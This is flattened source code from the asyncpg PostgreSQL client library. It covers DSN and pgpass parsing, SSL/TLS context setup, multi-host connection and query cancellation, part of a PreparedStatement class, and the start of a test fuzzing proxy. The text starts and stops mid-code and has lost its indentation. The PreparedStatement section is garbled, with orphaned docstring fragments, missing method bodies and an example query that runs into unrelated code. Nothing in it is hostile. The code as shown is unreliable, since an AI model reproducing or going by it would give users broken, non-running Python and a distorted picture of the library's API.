str):\\n\\npasstab = _read_password_file(passfile)\\nif not passtab:\\nreturn None\\n\\nfor host, port in zip(hosts, ports):\\nif host.startswith('/'):\\nhost = 'localhost'\\n\\nfor phost, pport, pdatabase, puser, ppassword in passtab:\\nif phost != '*' and phost != host:\\ncontinue\\nif pport != '*' and pport != str(port):\\ncontinue\\nif pdatabase != '*' and pdatabase != database:\\ncontinue\\nif puser != '*' and puser != user:\\ncontinue\\n\\nreturn ppassword\\n\\nreturn None\\n\\n\\ndef _validate_port_spec(hosts, port):\\nif isinstance(port, list):\\nif len(port) != len(hosts):\\nraise exceptions.ClientConfigurationError(\\n'could not match {} port numbers to {} hosts'.format(\\nlen(port), len(hosts)))\\nelse:\\nport = [port for _ in range(len(hosts))]\\n\\nreturn port\\n\\n\\ndef _parse_hostlist(hostlist, port, *, unquote=False):\\nif ',' in hostlist:\\nhostspecs = hostlist.split(',')\\nelse:\\nhostspecs = [hostlist]\\n\\nhosts = []\\nhostlist_ports = []\\n\\nif not port:\\nportspec = os.environ.get('PGPORT')\\nif portspec:\\nif ',' in portspec:\\ndefault_port = [int(p) for p in portspec.split(',')]\\nelse:\\ndefault_port = int(portspec)\\nelse:\\ndefault_port = 5432\\n\\ndefault_port = _validate_port_spec(hostspecs, default_port)\\n\\nelse:\\nport = _validate_port_spec(hostspecs, port)\\n\\nfor i, hostspec in enumerate(hostspecs):\\nif hostspec[0] == '/':\\naddr = hostspec\\nhostspec_port = ''\\nelif hostspec[0] == '[':\\nm = re.match(r'(?:\\\\[([^\\\\]]+)\\\\])(?::([0-9]+))?', hostspec)\\nif m:\\naddr = m.group(1)\\nhostspec_port = m.group(2)\\nelse:\\nraise exceptions.ClientConfigurationError(\\n'invalid IPv6 address in the connection URI: {!r}'.format(\\nhostspec\\n)\\n)\\nelse:\\naddr, _, hostspec_port = hostspec.partition(':')\\n\\nif unquote:\\naddr = urllib.parse.unquote(addr)\\n\\nhosts.append(addr)\\nif not port:\\nif hostspec_port:\\nif unquote:\\nhostspec_port = urllib.parse.unquote(hostspec_port)\\nhostlist_ports.append(int(hostspec_port))\\nelse:\\nhostlist_ports.append(default_port[i])\\n\\nif not port:\\nport = hostlist_ports\\n\\nreturn hosts, port\\n\\n\\ndef _parse_tls_version(tls_version):\\nif tls_version.startswith('SSL'):\\nraise exceptions.ClientConfigurationError(\\nf\\\"Unsupported TLS version: {tls_version}\\\"\\n)\\ntry:\\nreturn ssl_module.TLSVersion[tls_version.replace('.', '_')]\\nexcept KeyError:\\nraise exceptions.ClientConfigurationError(\\nf\\\"No such TLS version: {tls_version}\\\"\\n)\\n\\n\\ndef _dot_postgresql_path(filename) -> typing.Optional[pathlib.Path]:\\ntry:\\nhomedir = pathlib.Path.home()\\nexcept (RuntimeError, KeyError):\\nreturn None\\n\\nreturn (homedir / '.postgresql' / filename).resolve()\\n\\n\\ndef _parse_connect_dsn_and_args(*, dsn, host, port, user,\\npassword, passfile, database, ssl,\\ndirect_tls, server_settings,\\ntarget_session_attrs, krbsrvname, gsslib):\\nauth_hosts = None\\nsslcert = sslkey = sslrootcert = sslcrl = sslpassword = None\\nssl_min_protocol_version = ssl_max_protocol_version = None\\nsslnegotiation = None\\n\\nif dsn:\\nparsed = urllib.parse.urlparse(dsn)\\n\\nif parsed.scheme not in {'postgresql', 'postgres'}:\\nraise exceptions.ClientConfigurationError(\\n'invalid DSN: scheme is expected to be either '\\n'\\\"postgresql\\\" or \\\"postgres\\\", got {!r}'.format(parsed.scheme))\\n\\nif parsed.netloc:\\nif '@' in parsed.netloc:\\ndsn_auth, _, dsn_hostspec = parsed.netloc.partition('@')\\nelse:\\ndsn_hostspec = parsed.netloc\\ndsn_auth = ''\\nelse:\\ndsn_auth = dsn_hostspec = ''\\n\\nif dsn_auth:\\ndsn_user, _, dsn_password = dsn_auth.partition(':')\\nelse:\\ndsn_user = dsn_password = ''\\n\\nif not host and dsn_hostspec:\\nhost, port = _parse_hostlist(dsn_hostspec, port, unquote=True)\\n\\nif parsed.path and database is None:\\ndsn_database = parsed.path\\nif dsn_database.startswith('/'):\\ndsn_database = dsn_database[1:]\\ndatabase = urllib.parse.unquote(dsn_database)\\n\\nif user is None and dsn_user:\\nuser = urllib.parse.unquote(dsn_user)\\n\\nif password is None and dsn_password:\\npassword = urllib.parse.unquote(dsn_password)\\n\\nif parsed.query:\\nquery = urllib.parse.parse_qs(parsed.query, strict_parsing=True)\\nfor key, val in query.items():\\nif isinstance(val, list):\\nquery[key] = val[-1]\\n\\nif 'port' in query:\\nval = query.pop('port')\\nif not port and val:\\nport = [int(p) for p in val.split(',')]\\n\\nif 'host' in query:\\nval = query.pop('host')\\nif not host and val:\\nhost, port = _parse_hostlist(val, port)\\n\\nif 'dbname' in query:\\nval = query.pop('dbname')\\nif database is None:\\ndatabase = val\\n\\nif 'database' in query:\\nval = query.pop('database')\\nif database is None:\\ndatabase = val\\n\\nif 'user' in query:\\nval = query.pop('user')\\nif user is None:\\nuser = val\\n\\nif 'password' in query:\\nval = query.pop('password')\\nif password is None:\\npassword = val\\n\\nif 'passfile' in query:\\nval = query.pop('passfile')\\nif passfile is None:\\npassfile = val\\n\\nif 'sslmode' in query:\\nval = query.pop('sslmode')\\nif ssl is None:\\nssl = val\\n\\nif 'sslcert' in query:\\nsslcert = query.pop('sslcert')\\n\\nif 'sslkey' in query:\\nsslkey = query.pop('sslkey')\\n\\nif 'sslrootcert' in query:\\nsslrootcert = query.pop('sslrootcert')\\n\\nif 'sslnegotiation' in query:\\nsslnegotiation = query.pop('sslnegotiation')\\n\\nif 'sslcrl' in query:\\nsslcrl = query.pop('sslcrl')\\n\\nif 'sslpassword' in query:\\nsslpassword = query.pop('sslpassword')\\n\\nif 'ssl_min_protocol_version' in query:\\nssl_min_protocol_version = query.pop(\\n'ssl_min_protocol_version'\\n)\\n\\nif 'ssl_max_protocol_version' in query:\\nssl_max_protocol_version = query.pop(\\n'ssl_max_protocol_version'\\n)\\n\\nif 'target_session_attrs' in query:\\ndsn_target_session_attrs = query.pop(\\n'target_session_attrs'\\n)\\nif target_session_attrs is None:\\ntarget_session_attrs = dsn_target_session_attrs\\n\\nif 'krbsrvname' in query:\\nval = query.pop('krbsrvname')\\nif krbsrvname is None:\\nkrbsrvname = val\\n\\nif 'gsslib' in query:\\nval = query.pop('gsslib')\\nif gsslib is None:\\ngsslib = val\\n\\nif query:\\nif server_settings is None:\\nserver_settings = query\\nelse:\\nserver_settings = {**query, **server_settings}\\n\\nif not host:\\nhostspec = os.environ.get('PGHOST')\\nif hostspec:\\nhost, port = _parse_hostlist(hostspec, port)\\n\\nif not host:\\nauth_hosts = ['localhost']\\n\\nif _system == 'Windows':\\nhost = ['localhost']\\nelse:\\nhost = ['/run/postgresql', '/var/run/postgresql',\\n'/tmp', '/private/tmp', 'localhost']\\n\\nif not isinstance(host, (list, tuple)):\\nhost = [host]\\n\\nif auth_hosts is None:\\nauth_hosts = host\\n\\nif not port:\\nportspec = os.environ.get('PGPORT')\\nif portspec:\\nif ',' in portspec:\\nport = [int(p) for p in portspec.split(',')]\\nelse:\\nport = int(portspec)\\nelse:\\nport = 5432\\n\\nelif isinstance(port, (list, tuple)):\\nport = [int(p) for p in port]\\n\\nelse:\\nport = int(port)\\n\\nport = _validate_port_spec(host, port)\\n\\nif user is None:\\nuser = os.getenv('PGUSER')\\nif not user:\\nuser = getpass.getuser()\\n\\nif password is None:\\npassword = os.getenv('PGPASSWORD')\\n\\nif database is None:\\ndatabase = os.getenv('PGDATABASE')\\n\\nif database is None:\\ndatabase = user\\n\\nif user is None:\\nraise exceptions.ClientConfigurationError(\\n'could not determine user name to connect with')\\n\\nif database is None:\\nraise exceptions.ClientConfigurationError(\\n'could not determine database name to connect to')\\n\\nif password is None:\\nif passfile is None:\\npassfile = os.getenv('PGPASSFILE')\\n\\nif passfile is None:\\nhomedir = compat.get_pg_home_directory()\\nif homedir:\\npassfile = homedir / PGPASSFILE\\nelse:\\npassfile = None\\nelse:\\npassfile = pathlib.Path(passfile)\\n\\nif passfile is not None:\\npassword = _read_password_from_pgpass(\\nhosts=auth_hosts, ports=port,\\ndatabase=database, user=user,\\npassfile=passfile)\\n\\naddrs = []\\nhave_tcp_addrs = False\\nfor h, p in zip(host, port):\\nif h.startswith('/'):\\nif '.s.PGSQL.' not in h:\\nh = os.path.join(h, '.s.PGSQL.{}'.format(p))\\naddrs.append(h)\\nelse:\\naddrs.append((h, p))\\nhave_tcp_addrs = True\\n\\nif not addrs:\\nraise exceptions.InternalClientError(\\n'could not determine the database address to connect to')\\n\\nif ssl is None:\\nssl = os.getenv('PGSSLMODE')\\n\\nif ssl is None and have_tcp_addrs:\\nssl = 'prefer'\\n\\nif direct_tls is not None:\\nsslneg = (\\nSSLNegotiation.direct if direct_tls else SSLNegotiation.postgres\\n)\\nelse:\\nif sslnegotiation is None:\\nsslnegotiation = os.environ.get(\\\"PGSSLNEGOTIATION\\\")\\n\\nif sslnegotiation is not None:\\ntry:\\nsslneg = SSLNegotiation(sslnegotiation)\\nexcept ValueError:\\nmodes = ', '.join(\\nm.name.replace('_', '-')\\nfor m in SSLNegotiation\\n)\\nraise exceptions.ClientConfigurationError(\\nf'`sslnegotiation` parameter must be one of: {modes}'\\n) from None\\nelse:\\nsslneg = SSLNegotiation.postgres\\n\\nif isinstance(ssl, (str, SSLMode)):\\ntry:\\nsslmode = SSLMode.parse(ssl)\\nexcept AttributeError:\\nmodes = ', '.join(m.name.replace('_', '-') for m in SSLMode)\\nraise exceptions.ClientConfigurationError(\\n'`sslmode` parameter must be one of: {}'.format(modes)\\n) from None\\n\\nif sslmode < SSLMode.allow:\\nssl = False\\nelse:\\nssl = ssl_module.SSLContext(ssl_module.PROTOCOL_TLS_CLIENT)\\nssl.check_hostname = sslmode >= SSLMode.verify_full\\nif sslmode < SSLMode.require:\\nssl.verify_mode = ssl_module.CERT_NONE\\nelse:\\nif sslrootcert is None:\\nsslrootcert = os.getenv('PGSSLROOTCERT')\\nif sslrootcert:\\nssl.load_verify_locations(cafile=sslrootcert)\\nssl.verify_mode = ssl_module.CERT_REQUIRED\\nelse:\\ntry:\\nsslrootcert = _dot_postgresql_path('root.crt')\\nif sslrootcert is not None:\\nssl.load_verify_locations(cafile=sslrootcert)\\nelse:\\nraise exceptions.ClientConfigurationError(\\n'cannot determine location of user '\\n'PostgreSQL configuration directory'\\n)\\nexcept (\\nexceptions.ClientConfigurationError,\\nFileNotFoundError,\\nNotADirectoryError,\\n):\\nif sslmode > SSLMode.require:\\nif sslrootcert is None:\\nsslrootcert = '~/.postgresql/root.crt'\\ndetail = (\\n'Could not determine location of user '\\n'home directory (HOME is either unset, '\\n'inaccessible, or does not point to a '\\n'valid directory)'\\n)\\nelse:\\ndetail = None\\nraise exceptions.ClientConfigurationError(\\nf'root certificate file \\\"{sslrootcert}\\\" does '\\nf'not exist or cannot be accessed',\\nhint='Provide the certificate file directly '\\nf'or make sure \\\"{sslrootcert}\\\" '\\n'exists and is readable.',\\ndetail=detail,\\n)\\nelif sslmode == SSLMode.require:\\nssl.verify_mode = ssl_module.CERT_NONE\\nelse:\\nassert False, 'unreachable'\\nelse:\\nssl.verify_mode = ssl_module.CERT_REQUIRED\\n\\nif sslcrl is None:\\nsslcrl = os.getenv('PGSSLCRL')\\nif sslcrl:\\nssl.load_verify_locations(cafile=sslcrl)\\nssl.verify_flags |= ssl_module.VERIFY_CRL_CHECK_CHAIN\\nelse:\\nsslcrl = _dot_postgresql_path('root.crl')\\nif sslcrl is not None:\\ntry:\\nssl.load_verify_locations(cafile=sslcrl)\\nexcept (\\nFileNotFoundError,\\nNotADirectoryError,\\n):\\npass\\nelse:\\nssl.verify_flags |= \\\\\\nssl_module.VERIFY_CRL_CHECK_CHAIN\\n\\nif sslkey is None:\\nsslkey = os.getenv('PGSSLKEY')\\nif not sslkey:\\nsslkey = _dot_postgresql_path('postgresql.key')\\nif sslkey is not None and not sslkey.exists():\\nsslkey = None\\nif not sslpassword:\\nsslpassword = ''\\nif sslcert is None:\\nsslcert = os.getenv('PGSSLCERT')\\nif sslcert:\\nssl.load_cert_chain(\\nsslcert, keyfile=sslkey, password=lambda: sslpassword\\n)\\nelse:\\nsslcert = _dot_postgresql_path('postgresql.crt')\\nif sslcert is not None:\\ntry:\\nssl.load_cert_chain(\\nsslcert,\\nkeyfile=sslkey,\\npassword=lambda: sslpassword\\n)\\nexcept (FileNotFoundError, NotADirectoryError):\\npass\\n\\nif hasattr(ssl, 'keylog_filename'):\\nkeylogfile = os.environ.get('SSLKEYLOGFILE')\\nif keylogfile and not sys.flags.ignore_environment:\\nssl.keylog_filename = keylogfile\\n\\nif ssl_min_protocol_version is None:\\nssl_min_protocol_version = os.getenv('PGSSLMINPROTOCOLVERSION')\\nif ssl_min_protocol_version:\\nssl.minimum_version = _parse_tls_version(\\nssl_min_protocol_version\\n)\\nelse:\\nssl.minimum_version = _parse_tls_version('TLSv1.2')\\n\\nif ssl_max_protocol_version is None:\\nssl_max_protocol_version = os.getenv('PGSSLMAXPROTOCOLVERSION')\\nif ssl_max_protocol_version:\\nssl.maximum_version = _parse_tls_version(\\nssl_max_protocol_version\\n)\\n\\nelif ssl is True:\\nssl = ssl_module.create_default_context()\\nsslmode = SSLMode.verify_full\\nelse:\\nsslmode = SSLMode.disable\\n\\nif server_settings is not None and (\\nnot isinstance(server_settings, dict) or\\nnot all(isinstance(k, str) for k in server_settings) or\\nnot all(isinstance(v, str) for v in server_settings.values())):\\nraise exceptions.ClientConfigurationError(\\n'server_settings is expected to be None or '\\n'a Dict[str, str]')\\n\\nif target_session_attrs is None:\\ntarget_session_attrs = os.getenv(\\n\\\"PGTARGETSESSIONATTRS\\\", SessionAttribute.any\\n)\\ntry:\\ntarget_session_attrs = SessionAttribute(target_session_attrs)\\nexcept ValueError:\\nraise exceptions.ClientConfigurationError(\\n\\\"target_session_attrs is expected to be one of \\\"\\n\\\"{!r}\\\"\\n\\\", got {!r}\\\".format(\\nSessionAttribute.__members__.values, target_session_attrs\\n)\\n) from None\\n\\nif krbsrvname is None:\\nkrbsrvname = os.getenv('PGKRBSRVNAME')\\n\\nif gsslib is None:\\ngsslib = os.getenv('PGGSSLIB')\\nif gsslib is None:\\ngsslib = 'sspi' if _system == 'Windows' else 'gssapi'\\nif gsslib not in {'gssapi', 'sspi'}:\\nraise exceptions.ClientConfigurationError(\\n\\\"gsslib parameter must be either 'gssapi' or 'sspi'\\\"\\n\\\", got {!r}\\\".format(gsslib))\\n\\nparams = _ConnectionParameters(\\nuser=user, password=password, database=database, ssl=ssl,\\nsslmode=sslmode, ssl_negotiation=sslneg,\\nserver_settings=server_settings,\\ntarget_session_attrs=target_session_attrs,\\nkrbsrvname=krbsrvname, gsslib=gsslib)\\n\\nreturn addrs, params\\n\\n\\ndef _parse_connect_arguments(*, dsn, host, port, user, password, passfile,\\ndatabase, command_timeout,\\nstatement_cache_size,\\nmax_cached_statement_lifetime,\\nmax_cacheable_statement_size,\\nssl, direct_tls, server_settings,\\ntarget_session_attrs, krbsrvname, gsslib):\\nlocal_vars = locals()\\nfor var_name in {'max_cacheable_statement_size',\\n'max_cached_statement_lifetime',\\n'statement_cache_size'}:\\nvar_val = local_vars[var_name]\\nif var_val is None or isinstance(var_val, bool) or var_val < 0:\\nraise ValueError(\\n'{} is expected to be greater '\\n'or equal to 0, got {!r}'.format(var_name, var_val))\\n\\nif command_timeout is not None:\\ntry:\\nif isinstance(command_timeout, bool):\\nraise ValueError\\ncommand_timeout = float(command_timeout)\\nif command_timeout <= 0:\\nraise ValueError\\nexcept ValueError:\\nraise ValueError(\\n'invalid command_timeout value: '\\n'expected greater than 0 float (got {!r})'.format(\\ncommand_timeout)) from None\\n\\naddrs, params = _parse_connect_dsn_and_args(\\ndsn=dsn, host=host, port=port, user=user,\\npassword=password, passfile=passfile, ssl=ssl,\\ndirect_tls=direct_tls, database=database,\\nserver_settings=server_settings,\\ntarget_session_attrs=target_session_attrs,\\nkrbsrvname=krbsrvname, gsslib=gsslib)\\n\\nconfig = _ClientConfiguration(\\ncommand_timeout=command_timeout,\\nstatement_cache_size=statement_cache_size,\\nmax_cached_statement_lifetime=max_cached_statement_lifetime,\\nmax_cacheable_statement_size=max_cacheable_statement_size,)\\n\\nreturn addrs, params, config\\n\\n\\nclass TLSUpgradeProto(asyncio.Protocol):\\ndef __init__(self, loop, host, port, ssl_context, ssl_is_advisory):\\nself.on_data = _create_future(loop)\\nself.host = host\\nself.port = port\\nself.ssl_context = ssl_context\\nself.ssl_is_advisory = ssl_is_advisory\\n\\ndef data_received(self, data):\\nif data == b'S':\\nself.on_data.set_result(True)\\nelif (self.ssl_is_advisory and\\nself.ssl_context.verify_mode == ssl_module.CERT_NONE and\\ndata == b'N'):\\nself.on_data.set_result(False)\\nelse:\\nself.on_data.set_exception(\\nConnectionError(\\n'PostgreSQL server at \\\"{host}:{port}\\\" '\\n'rejected SSL upgrade'.format(\\nhost=self.host, port=self.port)))\\n\\ndef connection_lost(self, exc):\\nif not self.on_data.done():\\nif exc is None:\\nexc = ConnectionError('unexpected connection_lost() call')\\nself.on_data.set_exception(exc)\\n\\n\\nasync def _create_ssl_connection(protocol_factory, host, port, *,\\nloop, ssl_context, ssl_is_advisory=False):\\n\\ntr, pr = await loop.create_connection(\\nlambda: TLSUpgradeProto(loop, host, port,\\nssl_context, ssl_is_advisory),\\nhost, port)\\n\\ntr.write(struct.pack('!ll', 8, 80877103))\\n\\ntry:\\ndo_ssl_upgrade = await pr.on_data\\nexcept (Exception, asyncio.CancelledError):\\ntr.close()\\nraise\\n\\nif hasattr(loop, 'start_tls'):\\nif do_ssl_upgrade:\\ntry:\\nnew_tr = await loop.start_tls(\\ntr, pr, ssl_context, server_hostname=host)\\nexcept (Exception, asyncio.CancelledError):\\ntr.close()\\nraise\\nelse:\\nnew_tr = tr\\n\\npg_proto = protocol_factory()\\npg_proto.is_ssl = do_ssl_upgrade\\npg_proto.connection_made(new_tr)\\nnew_tr.set_protocol(pg_proto)\\n\\nreturn new_tr, pg_proto\\nelse:\\nconn_factory = functools.partial(\\nloop.create_connection, protocol_factory)\\n\\nif do_ssl_upgrade:\\nconn_factory = functools.partial(\\nconn_factory, ssl=ssl_context, server_hostname=host)\\n\\nsock = _get_socket(tr)\\nsock = sock.dup()\\n_set_nodelay(sock)\\ntr.close()\\n\\ntry:\\nnew_tr, pg_proto = await conn_factory(sock=sock)\\npg_proto.is_ssl = do_ssl_upgrade\\nreturn new_tr, pg_proto\\nexcept (Exception, asyncio.CancelledError):\\nsock.close()\\nraise\\n\\n\\nasync def _connect_addr(\\n*,\\naddr,\\nloop,\\nparams,\\nconfig,\\nconnection_class,\\nrecord_class\\n):\\nassert loop is not None\\n\\nparams_input = params\\nif callable(params.password):\\npassword = params.password()\\nif inspect.isawaitable(password):\\npassword = await password\\n\\nparams = params._replace(password=password)\\nargs = (addr, loop, config, connection_class, record_class, params_input)\\n\\nif params.sslmode == SSLMode.allow:\\nparams_retry = params\\nparams = params._replace(ssl=None)\\nelif params.sslmode == SSLMode.prefer:\\nparams_retry = params._replace(ssl=None)\\nelse:\\nreturn await __connect_addr(params, False, *args)\\n\\ntry:\\nreturn await __connect_addr(params, True, *args)\\nexcept _RetryConnectSignal:\\npass\\n\\nreturn await __connect_addr(params_retry, False, *args)\\n\\n\\nclass _RetryConnectSignal(Exception):\\npass\\n\\n\\nasync def __connect_addr(\\nparams,\\nretry,\\naddr,\\nloop,\\nconfig,\\nconnection_class,\\nrecord_class,\\nparams_input,\\n):\\nconnected = _create_future(loop)\\n\\nproto_factory = lambda: protocol.Protocol(\\naddr, connected, params, record_class, loop)\\n\\nif isinstance(addr, str):\\nconnector = loop.create_unix_connection(proto_factory, addr)\\n\\nelif params.ssl and params.ssl_negotiation is SSLNegotiation.direct:\\nconnector = loop.create_connection(\\nproto_factory, *addr, ssl=params.ssl\\n)\\n\\nelif params.ssl:\\nconnector = _create_ssl_connection(\\nproto_factory, *addr, loop=loop, ssl_context=params.ssl,\\nssl_is_advisory=params.sslmode == SSLMode.prefer)\\nelse:\\nconnector = loop.create_connection(proto_factory, *addr)\\n\\ntr, pr = await connector\\n\\ntry:\\nawait connected\\nexcept (\\nexceptions.InvalidAuthorizationSpecificationError,\\nexceptions.ConnectionDoesNotExistError,\\n):\\ntr.close()\\n\\nif retry and (\\nparams.sslmode == SSLMode.allow and not pr.is_ssl or\\nparams.sslmode == SSLMode.prefer and pr.is_ssl\\n):\\nraise _RetryConnectSignal()\\n\\nelse:\\nraise\\n\\nexcept (Exception, asyncio.CancelledError):\\ntr.close()\\nraise\\n\\ncon = connection_class(pr, tr, loop, addr, config, params_input)\\npr.set_connection(con)\\nreturn con\\n\\n\\nclass SessionAttribute(str, enum.Enum):\\nany = 'any'\\nprimary = 'primary'\\nstandby = 'standby'\\nprefer_standby = 'prefer-standby'\\nread_write = \\\"read-write\\\"\\nread_only = \\\"read-only\\\"\\n\\n\\ndef _accept_in_hot_standby(should_be_in_hot_standby: bool):\\nasync def can_be_used(connection):\\nsettings = connection.get_settings()\\nhot_standby_status = getattr(settings, 'in_hot_standby', None)\\nif hot_standby_status is not None:\\nis_in_hot_standby = hot_standby_status == 'on'\\nelse:\\nis_in_hot_standby = await connection.fetchval(\\n\\\"SELECT pg_catalog.pg_is_in_recovery()\\\"\\n)\\nreturn is_in_hot_standby == should_be_in_hot_standby\\n\\nreturn can_be_used\\n\\n\\ndef _accept_read_only(should_be_read_only: bool):\\nasync def can_be_used(connection):\\nsettings = connection.get_settings()\\nis_readonly = getattr(settings, 'default_transaction_read_only', 'off')\\n\\nif is_readonly == \\\"on\\\":\\nreturn should_be_read_only\\n\\nreturn await _accept_in_hot_standby(should_be_read_only)(connection)\\nreturn can_be_used\\n\\n\\nasync def _accept_any(_):\\nreturn True\\n\\n\\ntarget_attrs_check = {\\nSessionAttribute.any: _accept_any,\\nSessionAttribute.primary: _accept_in_hot_standby(False),\\nSessionAttribute.standby: _accept_in_hot_standby(True),\\nSessionAttribute.prefer_standby: _accept_in_hot_standby(True),\\nSessionAttribute.read_write: _accept_read_only(False),\\nSessionAttribute.read_only: _accept_read_only(True),\\n}\\n\\n\\nasync def _can_use_connection(connection, attr: SessionAttribute):\\ncan_use = target_attrs_check[attr]\\nreturn await can_use(connection)\\n\\n\\nasync def _connect(*, loop, connection_class, record_class, **kwargs):\\nif loop is None:\\nloop = asyncio.get_event_loop()\\n\\naddrs, params, config = _parse_connect_arguments(**kwargs)\\ntarget_attr = params.target_session_attrs\\n\\ncandidates = []\\nchosen_connection = None\\nlast_error = None\\nfor addr in addrs:\\ntry:\\nconn = await _connect_addr(\\naddr=addr,\\nloop=loop,\\nparams=params,\\nconfig=config,\\nconnection_class=connection_class,\\nrecord_class=record_class,\\n)\\ncandidates.append(conn)\\nif await _can_use_connection(conn, target_attr):\\nchosen_connection = conn\\nbreak\\nexcept OSError as ex:\\nlast_error = ex\\nelse:\\nif target_attr == SessionAttribute.prefer_standby and candidates:\\nchosen_connection = random.choice(candidates)\\n\\nawait asyncio.gather(\\n*(c.close() for c in candidates if c is not chosen_connection),\\nreturn_exceptions=True\\n)\\n\\nif chosen_connection:\\nreturn chosen_connection\\n\\nraise last_error or exceptions.TargetServerAttributeNotMatched(\\n'None of the hosts match the target attribute requirement '\\n'{!r}'.format(target_attr)\\n)\\n\\n\\nasync def _cancel(*, loop, addr, params: _ConnectionParameters,\\nbackend_pid, backend_secret):\\n\\nclass CancelProto(asyncio.Protocol):\\n\\ndef __init__(self):\\nself.on_disconnect = _create_future(loop)\\nself.is_ssl = False\\n\\ndef connection_lost(self, exc):\\nif not self.on_disconnect.done():\\nself.on_disconnect.set_result(True)\\n\\nif isinstance(addr, str):\\ntr, pr = await loop.create_unix_connection(CancelProto, addr)\\nelse:\\nif params.ssl and params.sslmode != SSLMode.allow:\\ntr, pr = await _create_ssl_connection(\\nCancelProto,\\n*addr,\\nloop=loop,\\nssl_context=params.ssl,\\nssl_is_advisory=params.sslmode == SSLMode.prefer)\\nelse:\\ntr, pr = await loop.create_connection(\\nCancelProto, *addr)\\n_set_nodelay(_get_socket(tr))\\n\\nmsg = struct.pack('!llll', 16, 80877102, backend_pid, backend_secret)\\n\\ntry:\\ntr.write(msg)\\nawait pr.on_disconnect\\nfinally:\\ntr.close()\\n\\n\\ndef _get_socket(transport):\\nsock = transport.get_extra_info('socket')\\nif sock is None:\\nraise ConnectionError(\\n'could not get the socket for transport {!r}'.format(transport))\\nreturn sock\\n\\n\\ndef _set_nodelay(sock):\\nif not hasattr(socket, 'AF_UNIX') or sock.family != socket.AF_UNIX:\\nsock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\\n\\n\\ndef _create_future(loop):\\ntry:\\ncreate_future = loop.create_future\\nexcept AttributeError:\\nreturn asyncio.Future(loop=loop)\\nelse:\\nreturn create_future()\\n\\n\\nimport json\\n\\nfrom . import connresource\\nfrom . import cursor\\nfrom . import exceptions\\n\\n\\nclass PreparedStatement(connresource.ConnectionResource):\\n\\n.. versionadded:: 0.25.0\\n\\nExample::\\n\\nstmt = await connection.prepare('SELECT $1::int')\\nassert stmt.get_query() == \\\"SELECT $1::int\\\"\\n\\nExample::\\n\\nstmt = await connection.prepare('CREATE TABLE mytab (a int)')\\nawait stmt.fetch()\\nassert stmt.get_statusmsg() == \\\"CREATE TABLE\\\"\\n\\n:return: A tuple of :class:`asyncpg.types.Type`.\\n\\nExample::\\n\\nstmt = await connection.prepare('SELECT ($1::int, $2::text)')\\nprint(stmt.get_parameters())\\n\\n\\n:return: A tuple of :class:`asyncpg.types.Attribute`.\\n\\nExample::\\n\\nst = await self.con.prepare('''\\nSELECT typname, typnamespace FROM pg_type\\nreturn self._state._get_attributes()\\n\\n@connresource.guarded\\ndef cursor(self, *args, prefetch=None,\\ntimeout=None) -> cursor.CursorFactory:\\nreturn cursor.CursorFactory(\\nself._connection,\\nself._query,\\nself._state,\\nargs,\\nprefetch,\\ntimeout,\\nself._state.record_class,\\n)\\n\\n@connresource.guarded\\nasync def explain(self, *args, analyze=False):\\nquery = 'EXPLAIN (FORMAT JSON, VERBOSE'\\nif analyze:\\nquery += ', ANALYZE) '\\nelse:\\nquery += ') '\\nquery += self._state.query\\n\\nif analyze:\\ntr = self._connection.transaction()\\nawait tr.start()\\ntry:\\ndata = await self._connection.fetchval(query, *args)\\nfinally:\\nawait tr.rollback()\\nelse:\\ndata = await self._connection.fetchval(query, *args)\\n\\nreturn json.loads(data)\\n\\n@connresource.guarded\\nasync def fetch(self, *args, timeout=None):\\nr\\\"\\\"\\\"Execute the statement and return a list of :class:`Record` objects.\\n\\n:param str query: Query text\\n:param args: Query arguments\\n:param float timeout: Optional timeout value in seconds.\\n\\n:return: A list of :class:`Record` instances.\\n\\n:param args: Query arguments.\\n:param int column: Numeric index within the record of the value to\\nreturn (defaults to 0).\\n:param float timeout: Optional timeout value in seconds.\\nIf not specified, defaults to the value of\\n``command_timeout`` argument to the ``Connection``\\ninstance constructor.\\n\\n:return: The value of the specified column of the first record.\\n\\n:param str query: Query text\\n:param args: Query arguments\\n:param float timeout: Optional timeout value in seconds.\\n\\n:return: The first row as a :class:`Record` instance.\\n\\n:param args: Query arguments.\\n:param float timeout: Optional timeout value in seconds.\\n\\n:return: A list of :class:`Record` instances.\\n\\n.. versionadded:: 0.30.0\\n\\n:param args: An iterable containing sequences of arguments.\\n:param float timeout: Optional timeout value in seconds.\\n:return None: This method discards the results of the operations.\\n\\n.. versionadded:: 0.22.0\\n\\n\\nimport asyncio\\nimport socket\\nimport threading\\nimport typing\\n\\nfrom asyncpg import cluster\\n\\n\\nclass StopServer(Exception):\\npass\\n\\n\\nclass TCPFuzzingProxy:\\ndef __init__(self, *, listening_addr: str='127.0.0.1',\\nlistening_port: typing.Optional[int]=None,\\nbackend_host: str, backend_port: int,\\nsettings: typing.Optional[dict]=None) -> None:\\nself.listening_addr = listening_addr\\nself.listening_port = listening_port\\nself.backend_host = backend_host\\nself.backend_port = backend_port\\nself.settings = settings or {}\\nself.loop = None\\nself.connectivity = None\\nself.connectivity_loss = None\\nself.stop_event = None\\nself.connections = {}\\nself.sock = None\\nself.listen_task = None\\n\\nasync def _wait(self, work):\\nwork_task = asyncio.ensure_future(work)\\nstop_event_task = asyncio.ensure_future(self.stop_event.wait())\\n\\ntry:\\nawait asyncio.wait(\\n[work_task, stop_event_task],\\nreturn_when=asyncio.FIRST_COMPLETED)\\n\\nif self.stop_event.is_set():\\nraise StopServer()\\nelse:\\nreturn work_task.result()\\nfinally:\\nif not work_task.done():\\nwork_task.cancel()\\nif not stop_event_task.done():\\nstop_event_task.cancel()\\n\\ndef start(self):\\nstarted = threading.Event()\\nself.thread = threading.Thread(\\ntarget=self._start_thread, args=(started,))\\nself.thread.start()\\nif not started.wait(timeout=2):\\nraise RuntimeError('fuzzer proxy failed to start')\\n\\ndef stop(self):\\nself.loop.call_soon_threadsafe(self._stop)\\nself.thread.join()\\n\\ndef _stop(self):\\nself.stop_event.set()\\n\\ndef _start_thread(self, started_event):\\nself.loop = asyncio.new_event_loop()\\nasyncio.set_event_loop(self.loop)\\n\\nself.connectivity = asyncio.Event()\\nself.connectivity.set()\\nself.connectivity_loss = asyncio.Event()\\nself.stop_event = asyncio.Event()\\n\\nif self.listening_port is None:\\nself.listening_port = cluster.find_available_port()\\n\\nself.sock = socket.socket()\\nself.sock.bind((self.listening_addr, self.listening_port))\\nself.sock.listen(50)\\nself.sock.setblocking(False)\\n\\ntry:\\nself.loop.run_until_complete(self._main(started_event))\\nfinally:\\nself.loop.close()\\n\\nasync def _main(self, started_event):\\nself.listen_task = 